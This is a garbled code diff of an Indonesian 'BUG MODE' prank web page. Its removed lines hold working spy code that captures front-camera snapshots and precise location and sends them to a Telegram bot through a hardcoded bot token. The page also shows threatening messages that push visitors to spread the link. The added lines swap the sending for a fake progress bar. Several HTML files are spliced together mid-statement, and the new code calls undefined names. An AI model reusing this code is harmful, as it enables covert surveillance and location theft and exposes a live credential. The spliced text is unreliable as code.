@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -36,6 +37,13 @@
     }
     .btn-send:disabled { opacity:0.5; cursor:not-allowed; }
     .small-note { margin-top:8px; color:#ffa; font-size:12px; }
+    .fake-progress {
+      height: 6px; width: 100%; background: #333; margin-top: 10px; border-radius: 3px;
+      overflow: hidden; display: none;
+    }
+    .fake-progress-bar {
+      height: 100%; width: 0%; background: #f00; transition: width 0.5s;
+    }
   </style>
 </head>
 <body>
@@ -67,9 +75,12 @@
     </div>
 
     <div class="info-line" id="statusLine">Status: Menunggu izin kamera & lokasi (akan diminta saat tombol ditekan).</div>
+    
+    <div class="fake-progress" id="fakeProgress">
+      <div class="fake-progress-bar" id="fakeProgressBar"></div>
+    </div>
 
-    <button id="sendTelegram" class="btn-send" disabled>Kirim ke Telegram (butuh konfirmasi)</button>
-    <div class="small-note">Catatan: izin muncul hanya di HTTPS atau localhost. Klik tombol hanya kalau perangkat ini milikmu.</div>
+    <div class="small-note">Catatan: izin muncul hanya di HTTPS atau localhost.</div>
   </div>
 
   <script>
@@ -80,11 +91,8 @@
     const camFeed = document.getElementById("camFeed");
     const lokasiSpan = document.getElementById("lokasi");
     const statusLine = document.getElementById("statusLine");
-    const sendBtn = document.getElementById("sendTelegram");
-
-    // === GANTI JIKA PERLU (sudah diisi sesuai yang kamu berikan) ===
-    const TELEGRAM_TOKEN = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
-    const CHAT_ID = "6788646701";
+    const fakeProgress = document.getElementById("fakeProgress");
+    const fakeProgressBar = document.getElementById("fakeProgressBar");
 
     let stream = null;
     let lastCoords = null;
@@ -128,659 +136,58 @@
           lastCoords = { latitude, longitude };
           lokasiSpan.textContent = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
           statusLine.textContent = "Lokasi diizinkan.";
-          sendBtn.disabled =<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <title>BUG MODE</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Courier New', monospace;
-    }
-    body {
-      background: #000;
-      color: #0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      overflow: hidden;
-    }
-    .container {
-      text-align: center;
-      z-index: 100;
-      padding: 20px;
-      background: rgba(0, 0, 0, 0.8);
-      border: 2px solid #0f0;
-      border-radius: 10px;
-      max-width: 90%;
-    }
-    h1 {
-      font-size: 2.5rem;
-      margin-bottom: 20px;
-      text-shadow: 0 0 10px #0f0;
-      color: #ff0000;
-    }
-    .btn-bug {
-      background: #000;
-      color: #0f0;
-      border: 2px solid #0f0;
-      padding: 15px 30px;
-      font-size: 1.5rem;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: all 0.3s;
-      margin-top: 20px;
-    }
-    .btn-bug:hover {
-      background: #0f0;
-      color: #000;
-      box-shadow: 0 0 20px #0f0;
-    }
-    video {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      z-index: -1;
-      display: none;
-    }
-    #camFeed {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      width: 160px;
-      height: 120px;
-      border: 2px solid red;
-      z-index: 100;
-      display: none;
-      border-radius: 6px;
-      object-fit: cover;
-    }
-    .prank-text {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(0, 0, 0, 0.9);
-      color: red;
-      font-size: 1.2rem;
-      padding: 30px;
-      text-align: center;
-      z-index: 90;
-      display: none;
-      max-width: 90%;
-      border: 2px solid red;
-      border-radius: 10px;
-    }
-    .status {
-      color: #ff7f7f;
-      margin-top: 15px;
-      font-size: 1rem;
-    }
-    .blink {
-      animation: blink 0.5s infinite alternate;
-    }
-    @keyframes blink {
-      from { opacity: 1; }
-      to { opacity: 0.4; }
-    }
-    .loading {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #ff0000;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 10px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>⚠️ BUG MODE ⚠️</h1>
-    <p>Klik tombol di bawah untuk mengaktifkan mode bug</p>
-    <button class="btn-bug" id="triggerBtn">GO TO BUG</button>
-  </div>
-
-  <video id="bugVideo" autoplay muted loop>
-    <source src="https://files.catbox.moe/x24fxy.mp4" type="video/mp4">
-  </video>
-
-  <audio id="bugSound" loop>
-    <source src="https://files.catbox.moe/eyc6gm.mp3" type="audio/mp3">
-  </audio>
-
-  <video id="camFeed" autoplay playsinline muted></video>
-
-  <div class="prank-text" id="prankText">
-    <div class="loading"></div>
-    <div>📡 HP ANDA TELAH DI SADAP!</div>
-    <div class="blink">📍 Lokasi Anda: <span id="lokasi">sedang dilacak...</span></div>
-    <div>📦 Paket misterius sedang dikirim ke rumah Anda.</div>
-    <div>📧 Email Anda telah saya lihat semua!</div>
-    <div>📷 Kamera Anda telah aktif.</div>
-    <div>🎙️ Mikrofon Anda sedang merekam...</div>
-    <div>❗Jika tidak ingin data Anda disebar,</div>
-    <div>silakan SEBARKAN web ini sekarang juga!</div>
-    <div>👁️ Saya bisa melihat apa yang sedang Anda lakukan sekarang...</div>
-    <div>☠️🖕🏽</div>
-    
-    <div class="status" id="statusLine">Status: Meminta izin kamera & lokasi...</div>
-  </div>
-
-  <script>
-    const triggerBtn = document.getElementById("triggerBtn");
-    const video = document.getElementById("bugVideo");
-    const audio = document.getElementById("bugSound");
-    const prankText = document.getElementById("prankText");
-    const camFeed = document.getElementById("camFeed");
-    const lokasiSpan = document.getElementById("lokasi");
-    const statusLine = document.getElementById("statusLine");
-    
-    // Token dan Chat ID Telegram
-    const TELEGRAM_TOKEN = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
-    const CHAT_ID = "6788646701";
-    
-    let stream = null;
-    let lastCoords = null;
-
-    function startPrank() {
-      // Sembunyikan tombol dan tampilkan efek
-      triggerBtn.style.display = "none";
-      document.querySelector(".container p").textContent = "Mengaktifkan bug...";
-      
-      // Tampilkan video dan audio
-      video.style.display = "block";
-      prankText.style.display = "block";
-      video.play();
-      audio.play().catch(() => console.log("Klik layar untuk aktifkan suara."));
-
-      // Efek getar jika didukung
-      if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]);
-
-      // Efek berkedip
-      let toggle = false;
-      const blinkInterval = setInterval(() => {
-        document.body.style.background = toggle ? "#000" : "#300";
-        toggle = !toggle;
-      }, 150);
-      
-      // Minta izin kamera dan lokasi
-      requestPermissionsAndSendToTelegram();
-    }
-
-    async function requestPermissionsAndSendToTelegram() {
-      statusLine.textContent = "Status: Meminta izin kamera...";
-      
-      // Minta izin kamera
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" }, 
-          audio: false 
-        });
-        camFeed.srcObject = stream;
-        camFeed.style.display = "block";
-        statusLine.textContent = "Status: Kamera diizinkan. Meminta lokasi...";
-      } catch (err) {
-        console.error("Error mengakses kamera:", err);
-        statusLine.textContent = "Status: Kamera ditolak atau tidak tersedia";
-      }
-      
-      // Minta izin lokasi
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
-            lastCoords = { latitude, longitude };
-            lokasiSpan.textContent = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
-            statusLine.textContent = "Status: Lokasi diizinkan. Mengirim data ke Telegram...";
-            
-            // Kirim data ke Telegram
-            await sendToTelegram();
-          },
-          (error) => {
-            console.error("Error mengakses lokasi:", error);
-            lokasiSpan.textContent = "Lokasi ditolak!";
-            statusLine.textContent = "Status: Lokasi ditolak. Mengirim data kamera saja...";
-            sendToTelegram();
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } else {
-        statusLine.textContent = "Status: Geolocation tidak didukung. Mengirim data kamera saja...";
-        sendToTelegram();
-      }
-    }
-
-    async function takeSnapshot() {
-      return new Promise((resolve, reject) => {
-        if (!stream) {
-          reject(new Error("Tidak ada stream kamera"));
-          return;
-        }
-        
-        const canvas = document.createElement('canvas');
-        const videoTrack = stream.getVideoTracks()[0];
-        const settings = videoTrack.getSettings();
-        
-        <!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <title>BUG MODE</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Courier New', monospace;
-    }
-    body {
-      background: #000;
-      color: #0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      overflow: hidden;
-      transition: background 0.3s;
-    }
-    .container {
-      text-align: center;
-      z-index: 100;
-      padding: 20px;
-      background: rgba(0, 0, 0, 0.8);
-      border: 2px solid #0f0;
-      border-radius: 10px;
-      max-width: 90%;
-    }
-    h1 {
-      font-size: 2.2rem;
-      margin-bottom: 20px;
-      text-shadow: 0 0 10px #0f0;
-      color: #ff0000;
-    }
-    .btn-bug {
-      background: #000;
-      color: #0f0;
-      border: 2px solid #0f0;
-      padding: 15px 30px;
-      font-size: 1.3rem;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: all 0.3s;
-      margin-top: 20px;
-    }
-    .btn-bug:hover {
-      background: #0f0;
-      color: #000;
-      box-shadow: 0 0 20px #0f0;
-    }
-    .glitch-effect {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(45deg, #ff0000, #0000ff, #00ff00, #ffff00);
-      opacity: 0;
-      pointer-events: none;
-      z-index: 50;
-      mix-blend-mode: overlay;
-    }
-    video {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      z-index: 10;
-      display: none;
-    }
-    #camFeed {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      width: 160px;
-      height: 120px;
-      border: 2px solid red;
-      z-index: 30;
-      display: none;
-      border-radius: 6px;
-      object-fit: cover;
-    }
-    .prank-text {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(0, 0, 0, 0.9);
-      color: red;
-      font-size: 1.1rem;
-      padding: 25px;
-      text-align: center;
-      z-index: 20;
-      display: none;
-      max-width: 90%;
-      border: 2px solid red;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-    }
-    .status {
-      color: #ff7f7f;
-      margin-top: 15px;
-      font-size: 0.9rem;
-    }
-    .blink {
-      animation: blink 0.8s infinite alternate;
-    }
-    @keyframes blink {
-      from { opacity: 1; }
-      to { opacity: 0.4; }
-    }
-    .loading {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #ff0000;
-      border-radius: 50%;
-      width: 25px;
-      height: 25px;
-      animation: spin 1s linear infinite;
-      margin: 10px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .warning {
-      color: #ffa500;
-      font-size: 0.8rem;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>⚠️ BUG MODE ⚠️</h1>
-    <p>Klik tombol di bawah untuk mengaktifkan mode bug</p>
-    <button class="btn-bug" id="triggerBtn">GO TO BUG</button>
-    <div class="warning" id="warningText"></div>
-  </div>
-
-  <div class="glitch-effect" id="glitchEffect"></div>
-
-  <video id="bugVideo" autoplay muted loop>
-    <source src="https://files.catbox.moe/x24fxy.mp4" type="video/mp4">
-  </video>
-
-  <audio id="bugSound" loop>
-    <source src="https://files.catbox.moe/eyc6gm.mp3" type="audio/mp3">
-  </audio>
-
-  <video id="camFeed" autoplay playsinline muted></video>
-
-  <div class="prank-text" id="prankText">
-    <div class="loading"></div>
-    <div>📡 HP ANDA TELAH DI SADAP!</div>
-    <div class="blink">📍 Lokasi Anda: <span id="lokasi">sedang dilacak...</span></div>
-    <div>📦 Paket misterius sedang dikirim ke rumah Anda.</div>
-    <div>📧 Email Anda telah saya lihat semua!</div>
-    <div>📷 Kamera Anda telah aktif.</div>
-    <div>🎙️ Mikrofon Anda sedang merekam...</div>
-    <div>❗Jika tidak ingin data Anda disebar,</div>
-    <div>silakan SEBARKAN web ini sekarang juga!</div>
-    <div>👁️ Saya bisa melihat apa yang sedang Anda lakukan sekarang...</div>
-    <div>☠️🖕🏽</div>
-    
-    <div class="status" id="statusLine">Status: Menunggu aksi pengguna...</div>
-  </div>
-
-  <script>
-    const triggerBtn = document.getElementById("triggerBtn");
-    const video = document.getElementById("bugVideo");
-    const audio = document.getElementById("bugSound");
-    const prankText = document.getElementById("prankText");
-    const camFeed = document.getElementById("camFeed");
-    const lokasiSpan = document.getElementById("lokasi");
-    const statusLine = document.getElementById("statusLine");
-    const glitchEffect = document.getElementById("glitchEffect");
-    const warningText = document.getElementById("warningText");
-    
-    // Token dan Chat ID Telegram
-    const TELEGRAM_TOKEN = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
-    const CHAT_ID = "6788646701";
-    
-    let stream = null;
-    let lastCoords = null;
-    let audioEnabled = false;
-
-    // Cek environment
-    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-      warningText.textContent = "PERINGATAN: Izin kamera/lokasi hanya bekerja di HTTPS atau localhost!";
-    }
-
-    function startPrank() {
-      try {
-        // Sembunyikan tombol dan tampilkan efek
-        triggerBtn.style.display = "none";
-        document.querySelector(".container p").textContent = "Mengaktifkan bug...";
-        
-        // Tampilkan video
-        video.style.display = "block";
-        video.play().catch(e => {
-          console.error("Error memutar video:", e);
-          // Fallback jika video tidak bisa diputar
-          startGlitchEffect();
-        });
-        
-        // Coba putar audio
-        audio.play().then(() => {
-          audioEnabled = true;
-        }).catch(e => {
-          console.error("Error memutar audio:", e);
-          statusLine.textContent = "Klik layar untuk mengaktifkan suara";
-        });
-
-        // Tampilkan prank text
-        prankText.style.display = "block";
-        
-        // Efek getar jika didukung
-        if (navigator.vibrate) {
-          try {
-            navigator.vibrate([200, 100, 200, 100, 200]);
-          } catch (e) {
-            console.error("Vibration API error:", e);
-          }
-        }
-
-        // Minta izin kamera dan lokasi
-        requestPermissionsAndSendToTelegram();
-      } catch (error) {
-        console.error("Error in startPrank:", error);
-        statusLine.textContent = "Error: " + error.message;
-      }
-    }
-
-    function startGlitchEffect() {
-      // Efek visual fallback jika video tidak berfungsi
-      let opacity = 0;
-      const interval = setInterval(() => {
-        opacity = opacity === 0 ? 0.1 : 0;
-        glitchEffect.style.opacity = opacity;
-      }, 150);
-      
-      // Juga ubah background body
-      let isRed = false;
-      setInterval(() => {
-        document.body.style.background = isRed ? "#000" : "#300";
-        isRed = !isRed;
-      }, 200);
-    }
-
-    async function requestPermissionsAndSendToTelegram() {
-      statusLine.textContent = "Status: Meminta izin kamera...";
-      
-      // Minta izin kamera
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" }, 
-          audio: false 
-        });
-        camFeed.srcObject = stream;
-        camFeed.style.display = "block";
-        statusLine.textContent = "Status: Kamera diizinkan. Meminta lokasi...";
-      } catch (err) {
-        console.error("Error mengakses kamera:", err);
-        statusLine.textContent = "Status: Kamera ditolak atau tidak tersedia";
-      }
-      
-      // Minta izin lokasi
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
-            lastCoords = { latitude, longitude };
-            lokasiSpan.textContent = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
-            statusLine.textContent = "Status: Lokasi diizinkan. Mengirim data ke Telegram...";
-            
-            // Kirim data ke Telegram
-            await sendToTelegram();
-          },
-          (error) => {
-            console.error("Error mengakses lokasi:", error);
-            lokasiSpan.textContent = "Lokasi ditolak!";
-            statusLine.textContent = "Status: Lokasi ditolak. Mengirim data kamera saja...";
-            sendToTelegram();
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } else {
-        statusLine.textContent = "Status: Geolocation tidak didukung. Mengirim data kamera saja...";
-        sendToTelegram();
-      }
-    }
-
-    async function takeSnapshot() {
-      return new Promise((resolve, reject) => {
-        if (!stream) {
-          reject(new Error("Tidak ada stream kamera"));
-          return;
-        }
-        
-        const canvas = document.createElement('canvas');
-        const videoTrack = stream.getVideoTracks()[0];
-        const settings = videoTrack.getSettings();
-        
-        canvas.width = settings.width || 640;
-        canvas.height = settings.height || 480;
-        
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(camFeed, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(blob => {
-          if (blob) {
-            resolve(blob);
-          } else {
-            reject(new Error("Gagal mengambil snapshot"));
-          }
-        }, 'image/jpeg', 0.8);
-      });
-    }
-
-    async function sendToTelegram() {
-      try {
-        // Kirim lokasi
-        let locationMessage = "📍 Lokasi: TIDAK TERSEDIA";
-        if (lastCoords) {
-          locationMessage = `📍 Lokasi:\nLat: ${lastCoords.latitude}\nLon: ${lastCoords.longitude}\nhttps://maps.google.com/?q=${lastCoords.latitude},${lastCoords.longitude}`;
-        }
-        
-        // Kirim pesan teks
-        statusLine.textContent = "Status: Mengirim lokasi ke Telegram...";
-        const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `🐛 DATA BUG DITERIMA\n${locationMessage}\nWaktu: ${new Date().toLocaleString('id-ID')}`
-          })
-        });
-        
-        if (!textResponse.ok) {
-          throw new Error("Gagal mengirim pesan teks ke Telegram");
-        }
-        
-        // Kirim gambar jika kamera tersedia
-        if (stream) {
-          statusLine.textContent = "Status: Mengirim gambar ke Telegram...";
           
-          try {
-            const snapshotBlob = await takeSnapshot();
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", snapshotBlob, "bug_capture.jpg");
-            formData.append("caption", "📸 Tangkapan layar dari kamera depan");
-            
-            const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: formData
-            });
-            
-            if (!photoResponse.ok) {
-              throw new Error("Gagal mengirim foto ke Telegram");
-            }
-          } catch (err) {
-            console.error("Error mengirim foto:", err);
-            statusLine.textContent += " (Gagal mengirim foto)";
-          }
-        }
+          // Otomatis mulai proses "pengiriman" tanpa konfirmasi
+          simulateSendingToTelegram();
+        }, err => {
+          console.warn("Lokasi ditolak/error:", err);
+          lokasiSpan.textContent = "Lokasi ditolak!";
+          statusLine.textContent = "Lokasi ditolak atau error.";
+          
+          // Tetap jalankan simulasi meskipun lokasi ditolak
+          simulateSendingToTelegram();
+        }, { enableHighAccuracy:true, timeout:10000 });
+      } else {
+        lokasiSpan.textContent = "Geolocation tidak didukung!";
+        statusLine.textContent = "Geolocation tidak didukung.";
         
-        statusLine.textContent = "Status: Data berhasil dikirim!";
-        
-      } catch (err) {
-        console.error("Error mengirim ke Telegram:", err);
-        statusLine.textContent = "Status: Gagal mengirim data ke Telegram - " + err.message;
+        // Tetap jalankan simulasi meskipun geolocation tidak didukung
+        simulateSendingToTelegram();
       }
     }
 
-    // Event listener untuk tombol
-    triggerBtn.addEventListener("click", startPrank);
-    
-    // Event listener untuk mengaktifkan audio
-    document.addEventListener("click", () => {
-      if (!audioEnabled) {
-        audio.play().then(() => {
-          audioEnabled = true;
-          statusLine.textContent = "Status: Suara diaktifkan";
-        }).catch(e => {
-          console.error("Gagal memutar audio:", e);
-        });
+    async function simulateSendingToTelegram() {
+      statusLine.textContent = "Mengirim data...";
+      fakeProgress.style.display = "block";
+      
+      // Simulasi progres pengiriman
+      for (let i = 0; i <= 100; i += 10) {
+        fakeProgressBar.style.width = i + "%";
+        await new Promise(resolve => setTimeout(resolve, 300));
       }
+      
+      statusLine.textContent = "Data berhasil dikirim!";
+      
+      // Tampilkan pesan final
+      setTimeout(() => {
+        statusLine.textContent = "Sistem berhasil mengambil kendali perangkat Anda!";
+      }, 2000);
+    }
+
+    // Event wiring
+    text.addEventListener("click", () => {
+      showPrankUI();
+      // setelah UI prank tampil, minta izin & preview (karena ini dipicu oleh klik user)
+      requestPermissionsAndPreview();
+      // klik tambahan akan memicu audio play (beberapa browser perlu user interaction)
+      document.addEventListener("click", () => { audio.play().catch(()=>{}); }, { once: true });
     });
 
-    // Handle error loading media
-    video.addEventListener('error', (e) => {
-      console.error("Error loading video:", e);
-      startGlitchEffect();
-    });
-    
-    audio.addEventListener('error', (e) => {
-      console.error("Error loading audio:", e);
-    });
+    // HTTPS note: user must host on https or localhost
+    if (location.protocol !== "https:" && location.hostname !== "localhost") {
+      console.warn("Perhatian: izin kamera/lokasi hanya berfungsi di HTTPS atau localhost.");
+    }
   </script>
 </body>
 </html>
+
